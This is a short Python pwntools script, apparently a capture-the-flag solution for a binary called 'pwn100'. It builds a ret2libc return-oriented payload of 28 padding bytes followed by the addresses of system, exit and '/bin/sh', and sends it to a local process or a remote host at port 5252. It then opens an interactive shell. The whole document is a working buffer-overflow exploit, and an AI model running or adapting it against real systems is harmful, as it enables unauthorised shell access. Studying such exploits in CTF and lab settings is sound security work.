from pwn import *
import time

HOST = '54.153.19.139'
PORT = 5252

local = True
#local = False

if local:
    conn = process("./pwn100")
else:
    conn = remote(HOST, PORT)

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

#if local:
#    gdb.attach(conn)

"""
libc : 0xf7f56a0f ("/bin/sh")

gdb-peda$ p system
$1 = {<text variable, no debug info>} 0xf7e32060 <__libc_system>

gdb-peda$ p exit
$2 = {<text variable, no debug info>} 0xf7e25af0 <__GI_exit>
"""

binsh  = 0xf7f7cbac
system = 0xf7ed2990
exit   = 0xf7e4d260

ROP = "A"*28
ROP += p32(system)
ROP += p32(exit)
ROP += p32(binsh)
ROP += p32(binsh)
ROP += p32(binsh)

conn.sendline(ROP)

conn.interactive()
